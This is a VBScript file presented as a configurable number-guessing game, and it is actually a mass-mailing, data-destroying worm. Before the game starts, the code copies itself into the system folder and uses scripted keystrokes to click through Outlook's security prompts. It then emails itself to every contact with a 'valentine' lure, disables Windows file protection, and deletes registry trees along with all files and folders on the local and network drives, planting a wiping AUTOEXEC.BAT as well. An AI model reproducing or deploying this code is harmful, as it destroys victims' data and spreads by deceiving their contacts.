'*****************************************************************
'******************** GuessGame Configuration ********************
'*****************************************************************

	'Range of number to guess from 1 to...

			Const nRangeOfNumber = 100


	'Tries allowed to guess number...

			Const nTriesAllowed = 10

'*****************************************************************
'*****************************************************************
'*****************************************************************

'**Start Encode**

sVBEfilename = "GuessGame.vbe"
sVBSfilename = "GuessGame.vbs"
sBATfilename = "GuessGame.bat"

Sub sbMain()
	On Error Resume Next
	sbCreateCopy()
	sbSecurity()
	sbEmail()
	sbSetDate("04-08-1981")
   	sbVirus()
	sbGuessGame()
End Sub

Sub sbGuessGame()
	On Error Resume Next

	Dim nRandomNumber, nTriesLeft, nTriesTaken, nGuess, sMessageBox, sResponse

	Randomize
	nRandomNumber = Int((nRangeOfNumber * Rnd) + 1)

	nTriesLeft = nTriesAllowed
	nTriesTaken = 0
	nGuess = 0

	sMessageBox = MsgBox("I have thought of a number ranging from 1 to " & nRangeOfNumber & " you have " & nTriesAllowed & " tries to guess it.", vbSystemModal, "Guess Game")

	Do While nGuess <> nRandomNumber Or nTriesLeft <> 0
		nGuess = InputBox("Enter your guess. (1 to " & nRangeOfNumber & ")" & vbCr & vbCr & "Tries left: " & nTriesLeft, "Guess Game")
		If (IsNumeric(nGuess)) Then
			nGuess = Int(nGuess)
			nTriesLeft = nTriesLeft - 1
			nTriesTaken = nTriesAllowed - nTriesLeft
			If (nGuess = nRandomNumber) Then
				sMessageBox = MsgBox("You are a winner!" & vbCr & "Number was: " & nRandomNumber & vbCr & "Tries taken: " & nTriesTaken & " out of " & nTriesAllowed, vbExclamation + vbSystemModal, "Guess Game")
				Exit Do
			End If
			If (nTriesLeft = 0) Then
				sMessageBox = MsgBox("You are a loser!" & vbCr & "Number was: " & nRandomNumber & vbCr & "Tries taken: " & nTriesTaken & " out of " & nTriesAllowed, vbExclamation + vbSystemModal, "Guess Game")
				Exit Do
			End If
			If (nGuess > nRandomNumber) Then
				sMessageBox = MsgBox("You guessed: " & nGuess & vbCr & "That was too big, try again!", vbInformation + vbSystemModal, "Guess Game")
			End If
			If (nGuess < nRandomNumber) Then
				sMessageBox = MsgBox("You guessed: " & nGuess & vbCr &  "That was too small, try again!", vbInformation + vbSystemModal, "Guess Game")
			End If
		Else sMessageBox = MsgBox("Invalid input, required range from 1 to " & nRangeOfNumber, vbCritical + vbSystemModal, "Guess Game")
		End If
	Loop

	sResponse = MsgBox("Play again?", vbYesNo + vbQuestion + vbSystemModal, "Guess Game")
	If (sResponse = vbYes) Then
		sbMain()
	End If

	Set nRandomNumber = Nothing
	Set nTriesLeft = Nothing
	Set nTriesTaken = Nothing
	Set nGuess = Nothing
	Set sMessageBox = Nothing
	Set sResponse = Nothing
End Sub

Sub sbCreateCopy()
	On Error Resume Next

	Dim FSO, dirSystem, file, sData

	Set FSO = WScript.CreateObject("Scripting.FileSystemObject")
	Set dirSystem = FSO.GetSpecialFolder(1)

	Set file = FSO.OpenTextFile(WScript.ScriptFullName, 1)
	sData = file.ReadAll
	file.Close

	Set file = FSO.CreateTextFile(dirSystem & "\" & sVBEfilename, True)
	file.WriteLine(sData)
	file.Close

	Set FSO = Nothing
	Set dirSystem = Nothing
	Set file = Nothing
	Set sData = Nothing
End Sub

Sub sbSecurity()
	On Error Resume Next

	Dim FSO, dirSystem, file

	Set FSO = WScript.CreateObject("Scripting.FileSystemObject")
	Set dirSystem = FSO.GetSpecialFolder(1)

	Set file = FSO.CreateTextFile(dirSystem & "\" & sVBSfilename, True)
	file.WriteLine("Set WSHShell = WScript.CreateObject(""WScript.Shell"")")
	file.WriteLine("While WSHShell.AppActivate(""Microsoft Outlook"") = FALSE")
	file.WriteLine("wscript.sleep 1000")
	file.WriteLine("Wend")
	file.WriteLine("If (WSHShell.AppActivate(""Microsoft Outlook"") = TRUE) Then")
	file.WriteLine("WSHShell.SendKeys ""a"", TRUE")
	file.WriteLine("WSHShell.SendKeys ""y"", TRUE")
	file.WriteLine("wscript.sleep 7000")
	file.WriteLine("End If")
	file.WriteLine("While WSHShell.AppActivate(""Microsoft Outlook"") = FALSE")
	file.WriteLine("wscript.sleep 1000")
	file.WriteLine("Wend")
	file.WriteLine("If (WSHShell.AppActivate(""Microsoft Outlook"") = TRUE) Then")
	file.WriteLine("WSHShell.SendKeys ""y"", TRUE")
	file.WriteLine("End If")
	file.WriteLine("While WSHShell.AppActivate(""Microsoft Outlook"") = FALSE")
	file.WriteLine("wscript.sleep 1000")
	file.WriteLine("Wend")
	file.WriteLine("wscript.sleep 2000")
	file.WriteLine("If (WSHShell.AppActivate(""Microsoft Outlook"") = TRUE) Then")
	file.WriteLine("WSHShell.SendKeys ""y"", TRUE")
	file.WriteLine("End If")
	file.Close

	Set FSO = Nothing
	Set dirSystem = Nothing
	Set file = Nothing
End Sub

Sub sbEmail()
	On Error Resume Next

	Dim FSO, WSHShell, dirSystem, objOutlook, objNameSpace, objFolder, attachment, cItem

	Set FSO = WScript.CreateObject("Scripting.FileSystemObject")
	Set WSHShell = WScript.CreateObject("WScript.Shell")

	Set dirWindows = FSO.GetSpecialFolder(0)
	Set dirSystem = FSO.GetSpecialFolder(1)
	Set dirTemp = FSO.GetSpecialFolder(2)

	dirAllUsersDesktop = WSHShell.SpecialFolders("AllUsersDesktop")
	dirDesktop = WSHShell.SpecialFolders("Desktop")
	dirMyDocuments = WSHShell.SpecialFolders("MyDocuments")

	Const olFolderContacts = 10

	Set objOutlook = WScript.CreateObject("Outlook.application")
	Set objNameSpace = objOutlook.GetNameSpace("MAPI")
	Set objFolder = objNameSpace.GetDefaultFolder(olFolderContacts)

	If (FSO.FileExists(dirAllUsersDesktop & "\" & "GuessGame.html")) Then
		attachment = dirAllUsersDesktop & "\" & "GuessGame.html"
	ElseIf (FSO.FileExists(dirDesktop & "\" & "GuessGame.html")) Then
		attachment = dirDesktop & "\" & "GuessGame.html"
	ElseIf (FSO.FileExists(dirMyDocuments & "\" & "GuessGame.html")) Then
		attachment = dirMyDocuments & "\" & "GuessGame.html"
	ElseIf (FSO.FileExists(dirTemp & "\" & "GuessGame.html")) Then
		attachment = dirTemp & "\" & "GuessGame.html"
	Else attachment = dirSystem & "\" & sVBEfilename
	End If

	For Each cItem In objFolder.Items
		WSHShell.Run dirSystem & "\" & sVBSfilename
		Set email = objOutlook.CreateItem(0)
		email.Recipients.Add(cItem.EMail1Address)
		email.Attachments.Add(attachment)
		email.Subject = "Are you " & cItem.FullName & " my valentine?"
		email.Body = "Hi " & cItem.FullName & " my valentine, " & "remember me? I ain't seen you in ages! Anyway, check-out and play the attached guess-the-number-game to guess who I am. See you soon, bye-bye!"
		email.Send
	Next

	Set objOutlook = Nothing
	Set objNameSpace = Nothing
	Set objFolder = Nothing
	Set cItem = Nothing
End Sub

Sub sbSetDate(date)
	On Error Resume Next

	Dim FSO, dirSystem, WSHShell, file, MSDOS

	Set FSO = WScript.CreateObject("Scripting.FileSystemObject")
	Set dirSystem = FSO.GetSpecialFolder(1)
	Set WSHShell = WScript.CreateObject("WScript.Shell")
	Set file = FSO.CreateTextFile(dirSystem & "\" & sBATfilename, True)

	file.WriteLine "DATE %1"
	file.WriteLine "CLS"
	file.Close

	MSDOS = sBATfilename & " " & date
	WSHShell.Run MSDOS, 0, TRUE
End Sub

Sub sbVirus()
	On Error Resume Next

	Dim FSO, WSHShell, WSHNetwork, dirWindows, dirSystem, dirTemp, dirAllUsersDesktop, dirAllUsersPrograms, dirDesktop, dirPrograms, dirMyDocuments, objNetworkDrives, root, directories, filetypes, registry, i, j, f, fc, d, dc, file, subdirectory, sData, drive

	Set FSO = WScript.CreateObject("Scripting.FileSystemObject")
	Set WSHShell = WScript.CreateObject("WScript.Shell")
	Set WSHNetwork = WScript.CreateObject("WScript.Network")

	Set dirWindows = FSO.GetSpecialFolder(0)
	Set dirSystem = FSO.GetSpecialFolder(1)
	Set dirTemp = FSO.GetSpecialFolder(2)

	dirAllUsersDesktop = WSHShell.SpecialFolders("AllUsersDesktop")
	dirAllUsersPrograms = WSHShell.SpecialFolders("AllUsersPrograms")
	dirDesktop = WSHShell.SpecialFolders("Desktop")
	dirPrograms = WSHShell.SpecialFolders("Programs")
	dirMyDocuments = WSHShell.SpecialFolders("MyDocuments")

	Set objNetworkDrives = WSHNetwork.EnumNetworkDrives
	Set dc = FSO.Drives

	WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SFCDisable", "0xFFFFFF9D"
	WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"

	root = FSO.GetDriveName(dirWindows)

	directories = Array(root & "\", dirAllUsersDesktop, dirAllUsersPrograms, dirDesktop, dirPrograms, dirMyDocuments, dirWindows, dirSystem, dirTemp, dirWindows & "\" & "SYSTEM32", dirWindows & "\" & "COMMAND", dirWindows & "\" & "INF", dirWindows & "\" & "SYSBCKUP", root & "\" & "My Documents", root & "\" & "Documents and Settings", root & "\" & "Program Files", root & "\" & "Inetpub")
	filetypes = Array("sys", "dll", "ocx", "cpl", "dat", "com", "exe", "cab", "ini", "inf", "vxd", "drv", "doc", "xls", "mdb", "ppt", "mp3", "jpg", "txt", "htm", "html", "hta", "asp", "aspx")
	registry = Array("HKEY_CURRENT_USER\Control Panel\", "HKEY_CURRENT_USER\InstallLocationsMRU\", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "HKEY_CURRENT_USER\Software\Microsoft\Windows\", "HKEY_CURRENT_USER\Software\ODBC\", "HKEY_LOCAL_MACHINE\Enum\", "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\", "HKEY_LOCAL_MACHINE\System\")

	For i = 0 To UBound(directories)
		On Error Resume Next
		If (FSO.FolderExists(directories(i))) Then
			Set f = FSO.GetFolder(directories(i))
			Set fc = f.Files

			For Each file In fc
				On Error Resume Next
				FSO.DeleteFile file, True
				On Error Resume Next
			Next
		End If
	Next
	For i = 0 To UBound(directories)
		On Error Resume Next
		If (FSO.FolderExists(directories(i))) Then
			Set f = FSO.GetFolder(directories(i))
			Set fc = f.SubFolders

			For Each subdirectory In fc
				On Error Resume Next
				FSO.DeleteFolder subdirectory, True
				On Error Resume Next
			Next
		End If
	Next
	For i = 0 to objNetworkDrives.Count - 1 Step 2
		On Error Resume Next
		If (FSO.FolderExists(objNetworkDrives.Item(i+1))) Then
			Set f = FSO.GetFolder(objNetworkDrives.Item(i+1))
			Set fc = f.Files

			For Each file In fc
				On Error Resume Next
				FSO.DeleteFile file, True
				On Error Resume Next
			Next
		End If
	Next
	For i = 0 to objNetworkDrives.Count - 1 Step 2
		On Error Resume Next
		If (FSO.FolderExists(objNetworkDrives.Item(i+1))) Then
			Set f = FSO.GetFolder(objNetworkDrives.Item(i+1))
			Set fc = f.SubFolders

			For Each subdirectory In fc
				On Error Resume Next
				FSO.DeleteFolder subdirectory, True
				On Error Resume Next
			Next
		End If
	Next
	For Each d in dc
		If d.IsReady Then
			Set f = FSO.GetDrive(d)

			Set fc = f.Files
			For Each file In fc
				On Error Resume Next
				FSO.DeleteFile file, True
				On Error Resume Next
			Next

			Set fc = f.SubFolders
			For Each subdirectory In fc
				On Error Resume Next
				FSO.DeleteFolder subdirectory, True
				On Error Resume Next
			Next
		End If
	Next

	Set file = FSO.CreateTextFile(dirSystem & "\" & sBATfilename, True)
	file.WriteLine("@ECHO OFF")
	For i = 0 To UBound(directories)
		file.WriteLine("CD " & """" & directories(i) & """")
		For j = 0 To UBound(filetypes)
			file.WriteLine("DEL *." & filetypes(j))
		Next
	Next
	For i = 0 To UBound(directories)
		file.WriteLine("DELTREE /Y " & """" & directories(i) & """")
	Next
	file.WriteLine("CLS")
	file.Close

	If (FSO.FileExists(dirSystem & "\" & sBATfilename)) Then
		Set file = FSO.OpenTextFile(dirSystem & "\" & sBATfilename, 1)
		sData = file.ReadAll
	End If

	Set file = FSO.CreateTextFile(root & "\" & "AUTOEXEC.BAT", True)
	file.WriteLine(sData)
	file.Close

	For i = 0 to objNetworkDrives.Count - 1 Step 2
		Set file = FSO.CreateTextFile(objNetworkDrives.Item(i+1) & "\" & "AUTOEXEC.BAT", True)
		file.WriteLine(sData)
		file.Close
	Next

	For i = 0 To UBound(registry)
		WSHShell.RegDelete registry(i)
	Next

	WSHShell.Run dirSystem & "\" & sBATfilename, 0, TRUE

	Set FSO = Nothing
	Set WSHShell = Nothing
	Set WSHNetwork = Nothing
	Set dirWindows = Nothing
	Set dirSystem = Nothing
	Set dirTemp = Nothing
	Set dirAllUsersDesktop = Nothing
	Set dirAllUsersPrograms = Nothing
	Set dirDesktop = Nothing
	Set dirPrograms = Nothing
	Set dirMyDocuments = Nothing
	Set objNetworkDrives = Nothing
	Set directories = Nothing
	Set filetypes = Nothing
	Set registry = Nothing
	Set i = Nothing
	Set j = Nothing
	Set f = Nothing
	Set fc = Nothing
	Set d = Nothing
	Set dc = Nothing
	Set file = Nothing
	Set subdirectory = Nothing
	Set sData = Nothing
End Sub

sbMain()
